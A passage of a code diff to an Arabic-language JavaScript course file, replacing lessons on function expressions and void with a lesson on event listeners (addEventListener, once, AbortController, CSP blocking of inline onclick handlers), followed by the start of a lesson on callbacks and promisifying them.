+Executing inline event handler violates the following Content Security Policy directive 'script-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present. The action has been blocked.
+property اشتغل
+listener اشتغل
+~~~
+
+الخطأ بيظهر **وقت الضغطة** مش وقت التحميل، فالصفحة شكلها سليم لحد ما حد يدوس. والـ nonce و الـ hash مبيشتغلوش على الـ attributes (زي ما الرسالة بتقول) إلا بـ [[unsafe-hashes]]. الحل الوحيد النضيف: تشيلها.
+
+**٢. لازم الـ function تبقى global.** [[onclick="addToCart(1)"]] بيدوّر على [[addToCart]] في [[window]]. ولو كودك [[type="module"]] (والمفروض يبقى)، الـ function مش على [[window]]:
+
+~~~text الـ Console (Chrome 157، نفس الصفحة والكود module)
+Uncaught ReferenceError: addToCart is not defined
+    at HTMLButtonElement.onclick
+~~~
+
+**٣. الكود متقسم بين ملفين:** تقرا الـ JS متعرفش مين بينده الـ function، ومحدش بيعمل lint أو test للنص اللي جوه الـ attribute.
+
+**٤. مفيش options ولا شيل نضيف.**
+
+التحويل سهل: [[data-*]] في الـ HTML وlistener واحد (تمرين ٣).
 
 ---
 
-## ٢. named function expression
+## ٤. الترتيب لما الطرق تتجمع
 
-~~~js
-const factorial = function fact(n) { return n <= 1 ? 1 : n * fact(n - 1); };
-console.log(factorial(5), factorial.name, typeof fact);
+~~~text الناتج: تمرين ١ (onclick ثم listener ثم onclick تاني ثم d مرتين ثم once، وضغطتين)
+C B D E C B D
 ~~~
 
-~~~text الناتج
-120 fact undefined
-~~~
-
-- [[fact]] اسم الـ expression نفسها: ظاهر **جوه** الدالة (فالـ recursion بيناديه)، ومش ظاهر برّه: [[typeof fact]] بـ [[undefined]].
-- [[factorial.name]] بقى [[fact]] مش [[factorial]]: الاسم المكتوب بيكسب.
-- الاسم ده مربوط بالدالة للأبد، فلو المتغير برّه اتغيّر الـ recursion مبيتأثرش (تمرين «قارن»).
-
----
-
-## ٣. function* expression و async function expression و async function* expression
-
-~~~js
-const ids = function* () { yield 1; yield 2; };
-const load = async function () { return 'loaded'; };
-const pages = async function* () { yield 'p1'; };
-console.log([...ids()], await load(), await Array.fromAsync(pages()), ids.name, pages.name);
-~~~
-
-~~~text الناتج
-[ 1, 2 ] loaded [ 'p1' ] ids pages
-~~~
-
-| الـ expression | بترجّع لما تتنادى | مثال استخدام |
-|---|---|---|
-| [[function* () {}]] | generator object | [[{ [Symbol.iterator]: function* () { ... } }]] |
-| [[async function () {}]] | Promise | [[(async function () { await main(); })()]] في CommonJS |
-| [[async function* () {}]] | async generator object | [[{ [Symbol.asyncIterator]: async function* () { ... } }]] |
-
-ومن غير اسم مكتوب، الـ expression اللي بتتحط مباشرة في [[const]] بتاخد اسم المتغير: [[ids.name]] بـ [[ids]] و [[pages.name]] بـ [[pages]].
-
----
-
-## ٤. class expression
-
-~~~js
-const Point = class { constructor(x) { this.x = x; } };
-const Timestamped = (Base) => class extends Base { stamp = 'T'; };
-console.log(new (Timestamped(Point))(3), Point.name);
-~~~
-
-~~~text الناتج
-Point { x: 3, stamp: 'T' } Point
-~~~
-
-- [[const Point = class { ... }]]: **class expression** من غير اسم، خدت اسم المتغير.
-- [[(Base) => class extends Base { ... }]]: arrow بترجّع class جديدة بتورث من أي [[Base]] تديهولها. ده **mixin**: [[Timestamped(Point)]] = Point ومعاها [[stamp]].
-- [[new (Timestamped(Point))(3)]]: الأقواس حوالين النداء لازم، وإلا [[new Timestamped(Point)]] كانت هتتعمل [[new]] على [[Timestamped]] نفسها.
-- named class expression ([[const Named = class Vec { static who() { return Vec.name; } }]]) زي الدالة: [[Vec]] ظاهر جوه بس، و [[Named.name]] بـ [[Vec]].
-- الـ class (expression أو declaration) ليها TDZ: [[new Later()]] قبل [[class Later {}]] بيرمي [[ReferenceError: Cannot access 'Later' before initialization]].
-
----
-
-## ٥. expression statement: سطر هو expression لوحده
-
-~~~js
-const obj = { a: 1 };
-let a;
-({ a } = obj);
-console.log(a, ({}).toString(), (() => ({ a: 1 }))(), (() => { a: 1 })());
-~~~
-
-~~~text الناتج
-1 [object Object] { a: 1 } undefined
-~~~
-
-أي سطر زي [[save();]] أو [[x = 5;]] أو [[a++;]] اسمه expression statement. والـ parser لما يشوف أول كلمة في السطر بيقرر:
-
-| السطر بيبدأ بـ | الـ parser بيفهمه | عشان تخليه expression |
-|---|---|---|
-| [[{]] | block | [[({ a } = obj);]] و [[({}).toString()]] |
-| [[function]] أو [[async function]] | declaration (لازم اسم) | [[(function () { ... })();]] |
-| [[class]] | class declaration (لازم اسم) | [[(class {});]] |
-| [[let []] | declaration بـ destructuring | بيفرق بس لو عندك متغير اسمه [[let]] في sloppy mode، فمتسمّيش متغير كده |
-
-- [[({ a } = obj)]]: destructuring assignment من غير [[let]] لازم أقواس، وإلا [[{ a }]] block.
-- [[(() => ({ a: 1 }))()]]: الأقواس حوالين الـ object عشان الـ arrow ترجّعه. و [[(() => { a: 1 })()]] رجّعت [[undefined]]: الـ [[{]] بقى جسم الدالة، و [[a:]] **label**، و [[1]] expression statement متجاهلة.
-
-### الـ ASI: لما السطر الجاي بيبدأ بقوس
-
-لو مش بتكتب [[;]]، JavaScript بيحطها لوحده **بس** لما السطر الجاي ميقدرش يكمّل اللي قبله. سطر بيبدأ بـ [[(]] أو [[[]] أو backtick **بيكمّل**:
-
-| الكود (سطرين من غير [[;]]) | اتقرا كـ | الناتج |
-|---|---|---|
-| [[const x = 1]] ثم [[(function () {})()]] | [[1(function () {})()]] | [[TypeError: 1 is not a function]] |
-| [[const t = 5]] ثم template literal [[.length]] | [[5$__bt...$__bt]] (tagged template) | [[TypeError: 5 is not a function]] |
-| [[const total = price * qty]] ثم [[(['SAVE10'] \|\| []).forEach(...)]] | [[qty(...)]] | [[TypeError: qty is not a function]] |
-
----
-
-## ٦. empty statement: [[;]] لوحدها
-
-[[;]] لوحدها جملة فاضية صحيحة. مفيدة لما الشغل كله في رأس الـ loop:
-
-~~~js
-let k = 0; while (k++ < 3);
-const arr = [];
-for (let i = 0; i < 3; arr.push(i++));
-~~~
-
-~~~text الناتج: console.log('k =', k) و console.log(arr)
-k = 4
-[ 0, 1, 2 ]
-~~~
-
-وخطيرة لما تيجي بالغلط بعد [[for (...)]] أو [[if (...)]]: الـ body بيبقى فاضي (تمرين «صلّح» التاني).
+كل الـ listeners على نفس العنصر بيشتغلوا بترتيب التسجيل، والـ handler property ليه مكان واحد في اللستة.
 
 ---
 
 ## الخلاصة
 
-| | declaration | expression |
-|---|---|---|
-| الشكل | جملة بتبدأ بـ [[function]] أو [[class]] | قيمة على يمين [[=]] أو argument أو بين أقواس |
-| الاسم | لازم | اختياري، ولو موجود ظاهر جوه بس |
-| قبل سطرها | [[function]]: موجودة، [[class]]: TDZ | مش موجودة (المتغير بقواعد [[var]] أو [[let]]) |
-| الأنواع | الخمسة | الخمسة، ومعاهم arrow |
+| عايز | اكتب |
+|---|---|
+| تسمع على حدث | [[el.addEventListener("click", fn)]] |
+| تشيله | [[el.removeEventListener("click", fn)]] بنفس [[fn]] |
+| مرة واحدة | [[{ once: true }]] |
+| تشيل مجموعة مرة واحدة | [[{ signal: controller.signal }]] و [[controller.abort()]] |
+| handler واحد على object انت عامله | [[img.onload = fn]] |
+| حاجة في الـ HTML | [[data-*]] attribute، مش [[onclick="..."]] |
 
-- السطر مينفعش يبدأ بـ [[{]] أو [[function]] أو [[class]] أو [[let []] لو قصدك expression: أقواس.
-- [[;]] قبل أي سطر بيبدأ بـ [[(]] أو [[[]] أو backtick لو مش بتكتبها.`,
+اللي ميتلخبطش: [[removeEventListener]] بيقارن الـ reference، و [[bind]] و arrow جديدة مش هي. و [[onclick =]] بيمسح اللي قبله من غير ما يقولك. و [[onclick="..."]] بيقع مع CSP ومع modules.`,
           lines: [
-            R`[[typeof]] قبل التعريفين: [[function]] للـ declaration، و [[undefined]] للـ expression اللي لسه سطرها متنفذش.`,
-            R`function declaration: بتتسجّل بقيمتها قبل أي سطر في الـ scope.`,
-            R`function expression من غير اسم جوه [[var]]: [[expr]] موجود من الأول بـ [[undefined]]، والدالة بتتعمل هنا بس.`,
-            R`named function expression: [[fact]] ظاهر جوه الدالة فبيستخدمه للـ recursion، والمتغير برّه اسمه [[factorial]].`,
-            R`[[120]]، والاسم [[fact]] (المكتوب بيكسب)، و [[typeof fact]] برّه [[undefined]].`,
-            R`[[function*]] expression: generator من غير اسم في [[const]].`,
-            R`async function expression: بترجّع Promise.`,
-            R`async function* expression: بترجّع async generator.`,
-            R`[[[ 1, 2 ]]] و [[loaded]] و [[[ 'p1' ]]]، والأسامي [[ids]] و [[pages]] اتاخدت من المتغيرات.`,
-            R`class expression من غير اسم، خدت اسم [[Point]] من المتغير.`,
-            R`arrow بترجّع class expression بتورث من أي [[Base]]: ده mixin بيزوّد [[stamp]].`,
-            R`عملنا instance من [[Timestamped(Point)]] (الأقواس عشان [[new]] ياخد نتيجة النداء)، فيها [[x]] و [[stamp]]، و [[Point.name]] بـ [[Point]].`,
-            R`object هنعمل منه destructuring.`,
-            R`متغير متعرّف من غير قيمة، هنملاه بـ destructuring assignment.`,
-            R`expression statement بيبدأ بـ [[(]] عشان الـ [[{ a }]] ميتقريش block: [[a]] بقى 1.`,
-            R`[[1]]، و [[({}).toString()]] بالأقواس شغالة، والـ arrow اللي بترجّع [[({ a: 1 })]] رجّعت object، واللي من غير أقواس رجّعت [[undefined]] (block و label).`,
+            R`الزرار اللي هنجرّب عليه`,
+            R`event handler property: قيمة واحدة على الخاصية [[onclick]]`,
+            R`التعيين التاني بيمسح الأول، فـ «onclick 1» مش هتتطبع أبدًا`,
+            R`function ليها اسم، عشان نقدر نشيلها بعدين بنفس الـ reference`,
+            R`أول listener بـ [[addEventListener]]: بيتحط في اللستة بعد مكان الـ [[onclick]]`,
+            R`نفس النوع ونفس الـ function: المتصفح بيتجاهله، فـ [[hello]] هتشتغل مرة واحدة`,
+            R`[[{ once: true }]]: بيتشال لوحده بعد أول مرة`,
+            R`[[click()]] بيعمل ضغطة من الكود: بيطبع «onclick 2» و «listener» و «مرة واحدة»`,
+            R`بنشيل [[hello]] بنفس الـ reference، فاتشالت فعلًا`,
+            R`[[null]] بيشيل الـ handler property`,
+            R`الضغطة التانية مبتطبعش حاجة: كل الطرق اتشالت`,
           ],
-          ref: [
-            { t: "MDN: function expression", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/function" },
-            { t: "MDN: function* expression", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/function*" },
-            { t: "MDN: async function expression", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/async_function" },
-            { t: "MDN: async function* expression", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/async_function*" },
-            { t: "MDN: class expression", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/class" },
-            { t: "MDN: Expression statement", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/Expression_statement" },
-            { t: "MDN: Empty statement", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/Empty" },
-            { t: "MDN: Automatic semicolon insertion", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar#automatic_semicolon_insertion" },
-          ],
-          pre: [{ to: "js/function و arrow", why: R`function declaration و expression و arrow في أبسط صورهم` }, { to: "js/hoisting و TDZ", why: R`التسجيل قبل التنفيذ والـ TDZ` }, { to: "js/module pattern و IIFE", why: R`الـ IIFE واستخدامها` }, { to: "js/class", why: R`الـ class declaration و [[extends]]` }],
-        },
-        {
-          cmd: "void: void 0 و fire-and-forget",
-          title: "void بيعمل إيه: void 0، و void في الـ arrow callbacks عشان النتيجة متتسرّبش، و void promise كعلامة «مش هستنى»",
-          desc: R`[[void expr]] بيقيّم الـ expression (يعني الكود بيشتغل فعلًا) وبعدين **يرمي** النتيجة ويرجّع [[undefined]]. ٣ استخدامات حقيقية:
-• [[void 0]]: طريقة مضمونة تكتب [[undefined]] (زمان [[undefined]] كان ممكن يتغطّى بمتغير محلي، و الـ minifiers لسه بيكتبوها لأنها أقصر).
-• في arrow بسطر واحد: [[() => void count++]] عشان الـ callback **ميرجّعش** قيمة بالغلط، في API بتفرق معاها القيمة اللي بترجع (handler بيرجّع [[false]] فبيلغي، أو effect في React لازم يرجّع function أو مفيش).
-• [[void save()]]: علامة صريحة «أنا قاصد مستناش الـ Promise دي». أدوات زي ESLint ([[no-floating-promises]] في typescript-eslint) بتقبلها. بس [[void]] **مبيمسكش** الأخطاء: لو الـ Promise اترفضت، Node بيقفل البرنامج. فالـ fire-and-forget الصح: [[void save().catch(log)]].
+          practice: [
+            { lvl: 'سريع', t: R`**اقرا وتوقّع:** [[b.onclick = () => log.push("A")]] ثم [[b.addEventListener("click", () => log.push("B"))]] ثم [[b.onclick = () => log.push("C")]] ثم [[d]] (بيضيف «D») بـ [[addEventListener]] مرتين ثم [[() => log.push("E")]] بـ [[{ once: true }]]. وبعدين [[b.click()]] مرتين. إيه اللي في [[log.join(" ")]]؟ (من قسمي ١ و ٤ في الشرح).`, done: R`كتبت «C B D E C B D» قبل التشغيل، وعارف ليه C الأول وليه D مرة واحدة في كل ضغطة.`, sol: R`~~~html order.html
+<button id="b">دوس</button>
+<script>
+const b = document.querySelector("#b");
+const log = [];
+b.onclick = () => log.push("A");
+b.addEventListener("click", () => log.push("B"));
+b.onclick = () => log.push("C");
+function d() { log.push("D"); }
+b.addEventListener("click", d);
+b.addEventListener("click", d);
+b.addEventListener("click", () => log.push("E"), { once: true });
+b.click();
+b.click();
+console.log(log.join(" "));
+</script>
+~~~
 
-و [[void]] operator بأولوية عالية: [[void 2 + 3]] = [[(void 2) + 3]] = [[NaN]]، فحط أقواس.`,
-          example: R`// void: قيّم الـ expression وارمي نتيجتها، ورجّع undefined
-console.log(void 0, void 'x', typeof void 0, void 0 === undefined);
-console.log(void 2 + 3, void (2 + 3));
-const ids = [];
-console.log([1, 2, 3].map((n) => ids.push(n)), [1, 2, 3].map((n) => void ids.push(n)));
+~~~text الناتج (Chrome 157)
+C B D E C B D
+~~~
+
+- **C الأول:** الـ property خدت أول مكان في اللستة لما اتعيّنت A، و C اتكتبت في نفس المكان.
+- **D مرة في كل ضغطة:** التسجيل التاني لنفس الـ function اتجاهل.
+- **E في الأولى بس:** [[once]].` },
+            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** class [[Saver]] فيها [[start() { this.btn.addEventListener("click", this.onClick.bind(this)); }]] و [[stop() { this.btn.removeEventListener("click", this.onClick.bind(this)); }]]. ادوس، [[stop()]]، ادوس تاني: العدّاد بقى كام؟ ليه؟ صلّحها بطريقتين (من قسم ١ في الشرح).`, done: R`النسخة البايظة عدّت ٢، والمصلّحة عدّت ١، وعرفت إن [[bind]] بيرجّع function جديدة كل مرة.`, sol: R`~~~html saver.html
+<button id="save">احفظ</button>
+<script>
+class Saver {
+  constructor(btn) { this.btn = btn; this.count = 0; }
+  onClick() { this.count++; }
+  start() { this.btn.addEventListener("click", this.onClick.bind(this)); }
+  stop() { this.btn.removeEventListener("click", this.onClick.bind(this)); }
+}
+const s = new Saver(document.querySelector("#save"));
+s.start(); s.btn.click(); s.stop(); s.btn.click();
+console.log("بايظ:", s.count, s.onClick.bind(s) === s.onClick.bind(s));
+
+// الحل ١: arrow في class field، فالـ reference ثابت
+class Saver2 {
+  constructor(btn) { this.btn = btn; this.count = 0; }
+  onClick = () => { this.count++; };
+  start() { this.btn.addEventListener("click", this.onClick); }
+  stop() { this.btn.removeEventListener("click", this.onClick); }
+}
+const s2 = new Saver2(document.querySelector("#save"));
+s2.start(); s2.btn.click(); s2.stop(); s2.btn.click();
+console.log("صح:", s2.count);
+</script>
+~~~
+
+~~~text الناتج (Chrome 157)
+بايظ: 2 false
+صح: 1
+~~~
+
+- **[[bind]] بيعمل function جديدة كل مرة** ([[false]] في المقارنة)، فـ [[removeEventListener]] دوّر على function مش متسجلة ومعملش حاجة، ومفيش error.
+- **الحل ١:** [[onClick = () => {...}]] كـ class field: function واحدة لكل object، و [[this]] فيها هو الـ object.
+- **الحل ٢ (الأنضف لما فيه كذا listener):** [[start() { this.ctrl = new AbortController(); this.btn.addEventListener("click", () => this.count++, { signal: this.ctrl.signal }); }]] و [[stop() { this.ctrl.abort(); }]].` },
+            { lvl: 'تطبيق', t: R`**refactor:** صفحة فيها [[<button onclick="addToCart(1)">قهوة</button>]] و [[<button onclick="addToCart(2)">شاي</button>]] و [[app.js]] فيه [[function addToCart(id)]]. شغّلها من سيرفر بيبعت [[Content-Security-Policy: script-src 'self']] وشوف الـ Console. وبعدين حوّلها لـ [[data-id]] و listener واحد، وخلي [[app.js]] يبقى [[type="module"]] (من قسم ٣ في الشرح).`, done: R`قبل: الضغطة مبتعملش حاجة ورسالة CSP في الـ Console. بعد: «السلة: 2 (آخر صنف 2)» بعد ضغطتين، ومفيش رسايل، و [[typeof window.addToCart]] = [["undefined"]].`, sol: R`~~~html index.html (بعد)
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head><meta charset="utf-8"><title>بعد</title></head>
+<body>
+<div id="products">
+  <button type="button" data-id="1">قهوة</button>
+  <button type="button" data-id="2">شاي</button>
+</div>
+<p id="cart">السلة: 0</p>
+<script type="module" src="app.js"></script>
+</body>
+</html>
+~~~
+
+~~~js app.js (بعد)
 let count = 0;
-const handlers = [() => count++, () => void count++];
-console.log(handlers.map((h) => h()), count);
-const save = async (x) => { if (x < 0) throw new Error('negative'); return 'saved ' + x; };
-void save(1);
-void save(-1).catch((e) => console.log('logged:', e.message));
-void function start() { console.log('void IIFE ran'); }();`,
-          try: R`اعمل ملف [[.cjs]] فيه [[const save = async () => { throw new Error('disk full'); };]] وبعدين [[void save();]] وبعدين [[setTimeout(() => console.log('still alive?'), 20);]]. شغّله واطبع الـ exit code ([[echo $?]] في Git Bash أو [[$LASTEXITCODE]] في PowerShell). البرنامج كمّل؟ وبعدين ضيف [[.catch]] وشغّل تاني.`,
-          sol: R`~~~js fire.cjs
-const save = async () => { throw new Error('disk full'); };
-void save();
-setTimeout(() => console.log('still alive?'), 20);
+function addToCart(id) {
+  count++;
+  document.querySelector("#cart").textContent = "السلة: " + count + " (آخر صنف " + id + ")";
+}
+document.querySelector("#products").addEventListener("click", e => {
+  const btn = e.target.closest("button[data-id]");
+  if (btn) addToCart(Number(btn.dataset.id));
+});
+console.log("addToCart على window؟", typeof window.addToCart);
 ~~~
 
-~~~text الناتج: node fire.cjs; echo "exit $?" (Node 24.22، المسار الكامل وسطور node:internal اتشالوا)
-const save = async () => { throw new Error('disk full'); };
-                                 ^
+~~~text الناتج (Chrome 157، السيرفر بيبعت script-src 'self')
+قبل: ضغطة على «قهوة» ← رسالة «Executing inline event handler violates ...» مرتين في الـ Console، والسلة فضلت «السلة: 0»
+بعد: addToCart على window؟ undefined
+بعد: ضغطتين ← «السلة: 2 (آخر صنف 2)»
+~~~
 
-Error: disk full
-    at save (fire.cjs:1:34)
-    at Object.<anonymous> (fire.cjs:2:6)
+- **السيرفر اللي جرّبنا بيه** (سيرفر [[node:http]] صغير) كان بيعمل [[res.setHeader("Content-Security-Policy", "script-src 'self'")]] لأي صفحة تحت [[/csp/]]. في Chrome 157 الرسالة ظهرت مرتين لضغطة واحدة.
+- **[[data-id]]** بيشيل البيانات في الـ HTML، والسلوك كله في الـ JS. و [[Number(...)]] لأن [[dataset]] دايمًا نص.
+- **listener واحد على الأب** بدل واحد لكل زرار (event delegation)، فالزراير اللي تتضاف بعدين شغالة من غير كود زيادة.
+- **الـ module** خلّى [[addToCart]] مش global، فمحدش برّه يقدر يناديها أو يكتب عليها.` },
+            { lvl: 'تطبيق', t: R`**ابني:** بانل «الفلاتر» بيفتح بزرار، ولما يفتح بيسجّل ٣ listeners (Esc على [[document]]، وضغطة برّه البانل، وزرار «اقفل») كلهم بنفس [[signal]]، ولما يقفل [[controller.abort()]] واحدة تشيلهم كلهم. اعرض عدد الـ listeners الشغالة في سطر (من قسم ١ في الشرح).`, done: R`بعد الفتح العدد ٣، وبعد Esc أو ضغطة برّه أو «اقفل» العدد ٠، وفتحه مرتين ورا بعض مبيسجلش ٦.`, sol: R`~~~live 230 بانل بـ AbortController
+<style>
+  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; min-height: 240px; }
+  #panel { border: 2px solid #0b6e4f; border-radius: 8px; padding: 10px; margin-top: 8px; max-width: 300px; background: #fff; }
+  button { font: inherit; }
+</style>
+<button type="button" id="open">افتح الفلاتر</button>
+<p id="log">listeners شغالة: 0</p>
+<div id="panel" hidden>
+  <p>الفلاتر هنا. اقفلها بـ Esc أو بضغطة برّه.</p>
+  <button type="button" id="close">اقفل</button>
+</div>
+<script>
+const panel = document.querySelector("#panel");
+const log = document.querySelector("#log");
+let controller = null;
+let active = 0;
+
+function count(n) { active += n; log.textContent = "listeners شغالة: " + active; }
+
+function openPanel() {
+  if (controller) return;
+  panel.hidden = false;
+  controller = new AbortController();
+  const { signal } = controller;
+  document.addEventListener("keydown", e => { if (e.key === "Escape") closePanel(); }, { signal });
+  document.addEventListener("click", e => { if (!panel.contains(e.target) && e.target.id !== "open") closePanel(); }, { signal });
+  document.querySelector("#close").addEventListener("click", closePanel, { signal });
+  count(3);
+  signal.addEventListener("abort", () => count(-3), { once: true });
+}
+function closePanel() {
+  panel.hidden = true;
+  controller.abort();
+  controller = null;
+}
+document.querySelector("#open").addEventListener("click", openPanel);
+</script>
+~~~
+
+~~~text الناتج (Chrome 157، Playwright)
+فتح:           listeners شغالة: 3 (البانل ظاهر)
+فتح تاني:      listeners شغالة: 3
+Esc:           listeners شغالة: 0 (البانل مستخبي)
+ضغطة جوه:      البانل لسه ظاهر
+ضغطة برّه:     listeners شغالة: 0
+زرار «اقفل»:   listeners شغالة: 0
+~~~
+
+- **[[{ signal }]]** بيربط كل listener بالـ controller. [[abort()]] بيشيلهم كلهم، حتى الـ arrows اللي ملهاش اسم (اللي [[removeEventListener]] مكانش هيعرف يشيلها).
+- **[[if (controller) return]]** بيمنع إن الفتح مرتين يسجّل ٦.
+- **[[e.target.id !== "open"]]:** نفس الضغطة اللي فتحت البانل بتوصل لـ [[document]] بالـ bubbling، ومن غير الشرط ده كانت هتقفله على طول.
+- **controller جديد كل فتحة:** الـ signal اللي اتعمله [[abort]] مبيرجعش، وأي listener تسجّله بيه بعد كده مش بيتسجّل أصلًا.` },
+            { lvl: 'سريع', t: R`**اشرحها:** زميلك بيقولك «[[onclick="save()"]] أسهل وشغالة عندي». اكتبله ٣ أسباب في ٣ سطور ليه هتقع في الشغل الحقيقي، بالخطأ اللي هيشوفه في كل سبب (من قسم ٣ في الشرح).`, done: R`٣ أسباب مختلفة، كل واحد معاه رسالة الخطأ أو النتيجة الحقيقية.`, sol: R`**إجابة نموذجية:**
+
+1. **الـ CSP:** أول ما الموقع يحط [[Content-Security-Policy]] من غير [[unsafe-inline]] (وده المفروض في أي موقع فيه login)، الضغطة مش هتعمل حاجة والـ Console هيقول «Executing inline event handler violates the following Content Security Policy directive». ومفيش nonce ينفع مع الـ attribute.
+2. **الـ modules:** لو الكود [[type="module"]] أو اتعمله bundle، [[save]] مش global، والضغطة هترمي «Uncaught ReferenceError: save is not defined». والحل الغلط إنك تكتب [[window.save = save]] وتفتح كل حاجة للعالم.
+3. **الصيانة:** الكود اللي بيتنفّذ مكتوب كنص في الـ HTML، فالـ lint والـ tests والبحث عن «مين بينده save» مش هيلاقوه، ولو حد عمل [[el.onclick = ...]] من JS هيمسحه من غير error.
+
+والبديل في سطرين: [[<button data-action="save">]] و [[document.addEventListener("click", e => { if (e.target.closest("[data-action=save]")) save(); })]].` },
+          ],
+          ref: [
+            { t: "MDN: EventTarget.addEventListener()", url: "https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener" },
+            { t: "MDN: EventTarget.removeEventListener()", url: "https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/removeEventListener" },
+            { t: "MDN Learn: Introduction to events", url: "https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Events" },
+            { t: "MDN: Content Security Policy (CSP)", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" },
+            { t: "MDN: CSP script-src", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src" },
+          ],
+          pre: ["js/addEventListener", { to: "web/Content Security Policy", why: R`الـ header اللي بيمنع الـ inline handlers، وإزاي تقراه في DevTools` }, { to: "js/call و apply و bind", why: R`ليه [[bind]] بيرجّع function جديدة` }],
+          deep: {
+            why: R`الـ MDN Curriculum بيطلب الطرق التلاتة لأنك هتقابلهم كلهم: [[addEventListener]] في كودك، و [[onload =]] في APIs قديمة، و [[onclick="..."]] في كود قديم أو tutorials. ولازم تعرف تحوّل التالتة للأولى قبل ما الـ CSP يكسر الموقع.`,
+            how: R`كل [[EventTarget]] عنده لستة listeners. [[addEventListener]] بيضيف لها لو التوليفة (النوع، الـ function، [[capture]]) مش موجودة. الـ handler property listener واحد خاص في نفس اللستة، والتعيين بيبدّل الـ function اللي فيه. الـ inline attribute بيتحوّل لنفس الـ handler property، والتحويل نفسه (compile للنص) هو اللي الـ CSP بيمنعه.`,
+            when: R`[[addEventListener]] دايمًا للعناصر. [[signal]] لأي مجموعة listeners ليها عمر (مودال، صفحة في SPA، component). الـ property لـ object انت صاحبه لوحدك ([[img.onload]] و [[reader.onload]]). الـ inline أبدًا في كود جديد.`,
+            mistakes: R`[[removeEventListener]] بـ arrow أو [[bind]] جديدة. [[onclick =]] على عنصر مكتبة تانية بتسمع عليه. [[onclick="..."]] مع CSP أو module. [[addEventListener("onclick")]] (اسم الحدث [["click"]] من غير on). نسيان [[capture: true]] في الشيل لو اتسجّل بيه.`,
+          },
+        },
+        {
+          cmd: "callbacks و events: الـ async قبل Promise",
+          title: "قبل Promise و await: إزاي JavaScript كان بيستنى بالـ callbacks والأحداث، وإزاي تحوّلهم لـ Promise",
+          desc: R`قبل 2015 مكانش فيه [[Promise]]. أي حاجة بتاخد وقت (تايمر، ملف، طلب شبكة، صورة) كانت بتاخد **callback**: function بتديها للـ API وهو بينادي عليها لما يخلص، أو بتطلّع **أحداث** ([[load]] و [[error]]) تسمع عليها. الأسلوبين لسه موجودين في كل حتة، والدرس ده بيوريك شكلهم ومشاكلهم وإزاي تلفّهم في Promise عشان تستخدم [[await]].
+• Node: الـ error-first callback [[(err, value) => {}]] و [[util.promisify]] و [[fs/promises]].
+• المتصفح: [[XMLHttpRequest]] بأحداث [[load]] و [[error]]، و [[img.onload]] و [[img.onerror]].
+• المشاكل: callback hell، ونسيان [[return]] بعد الخطأ، وcallback بيتنده مرتين، وcallback مرة sync ومرة async.
+• الحل: [[new Promise((resolve, reject) => ...)]] حوالين الـ callback، و [[events.once]] للأحداث.`,
+          example: R`const fs = require("node:fs");
+console.log("1. قبل");
+setTimeout(() => console.log("4. الـ timer خلص"), 0);
+fs.readFile("shop.json", "utf8", (err, text) => {
+  if (err) return console.log("5. خطأ:", err.code);
+  console.log("5. الملف:", JSON.parse(text).name);
+});
+fs.readFile("missing.json", "utf8", (err, text) => {
+  if (err) return console.log("6. خطأ:", err.code, typeof text);
+});
+console.log("2. بعد");
+console.log("3. الكود خلص، والـ callbacks لسه مستنية");`,
+          try: R`اعمل [[shop.json]] فيه [[{"name":"متجر النور","orders":3}]] وشغّل المثال بـ [[node callbacks.js]]. بالترتيب إيه؟ وشغّله ٣ مرات: ٥ و ٦ بيتبدّلوا؟ وبعدين شيل [[return]] من سطر الخطأ الأول وغيّر اسم الملف لحاجة مش موجودة: إيه اللي حصل؟`,
+          sol: R`~~~text الناتج (node callbacks.js، Node 24.22)
+1. قبل
+2. بعد
+3. الكود خلص، والـ callbacks لسه مستنية
+4. الـ timer خلص
+6. خطأ: ENOENT undefined
+5. الملف: متجر النور
+~~~
+
+- ١ و ٢ و ٣ الأول دايمًا: الكود العادي بيخلص كله قبل أي callback.
+- ٦ قبل ٥ هنا لأن الملف اللي مش موجود فشل أسرع من قراية الملف الموجود. **الترتيب بين ٥ و ٦ مش مضمون**: كل واحد بيخلص في وقته. لو محتاج ترتيب، لازم التاني يبدأ جوه callback الأول (وده اللي بيعمل callback hell) أو [[await]].
+- من غير [[return]]: الكود كمّل بعد سطر الخطأ، و [[text]] = [[undefined]]، و [[JSON.parse(undefined)]] رمى [[SyntaxError: "undefined" is not valid JSON]] ووقّع البرنامج (تمرين ٣).`,
+          teach: R`## الفكرة
+
+JavaScript بيشغّل حاجة واحدة في المرة (درس «event loop»). لو استنى ملف أو شبكة، الصفحة كلها هتقف. فالـ APIs البطيئة بتشتغل في الخلفية، والسؤال: إزاي ترجّعلك النتيجة؟ من أول JavaScript لحد 2015 كان فيه إجابتين بس:
+
+| الأسلوب | الشكل | فين لسه موجود |
+|---|---|---|
+| **callback** | تبعت function، والـ API ينادي عليها مرة لما يخلص | [[setTimeout]]، و [[fs.readFile]] في Node، ومكتبات قديمة |
+| **events** | الـ object بيطلّع أحداث، وانت تسمع عليها (ممكن تتكرر) | [[XMLHttpRequest]] و [[img.onload]] و [[FileReader]] و [[EventEmitter]] و [[WebSocket]] |
+
+وبعدين جه [[Promise]] (ES2015) و [[async]] و [[await]] (ES2017) كطبقة فوقهم. كل نواتج Node من Node 24.22، ونواتج المتصفح من Chrome 157.
+
+---
+
+## ١. الـ callback: «ناديني لما تخلص»
+
+~~~text الناتج: المثال
+1. قبل
+2. بعد
